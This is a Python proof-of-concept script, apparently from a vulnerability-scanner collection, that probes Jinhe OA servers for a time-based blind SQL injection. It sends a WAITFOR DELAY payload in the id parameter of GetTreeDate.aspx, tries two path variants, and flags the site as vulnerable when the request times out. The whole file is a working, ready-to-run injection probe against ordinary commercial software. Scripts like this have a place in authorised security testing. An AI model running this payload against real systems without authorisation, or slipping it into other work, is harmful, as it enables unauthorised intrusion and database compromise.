'''
Function:
    金和OA sql注入漏洞
Author:
    spmonkey
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.cont = 0
        self.character = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
        self.db_list = []
        self.result_text = ""
        self.request_headers = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        url = "{}://{}/JC6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a10'+--%20and%201=1".format(scheme, netloc)
        try:
            result = requests.get(url=url, headers=self.headers, verify=False, timeout=5, proxies=self.proxies)
            if result.status_code == 404:
                url = "{}://{}/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a10'+--%20and%201=1".format(scheme, netloc)
                result = requests.get(url=url, headers=self.headers, verify=False, timeout=5, proxies=self.proxies)
                for request_type, request_text in dict(result.request.headers).items():
                    self.request_headers += "                 {}: {}".format(request_type, request_text)
            return False
        except Exception as e:
            if "timed out" in str(e):
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在SQL注入漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}
{}""".format(target.path + "?" + target.query, target.netloc, self.request_headers)
                return True
            else:
                return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False

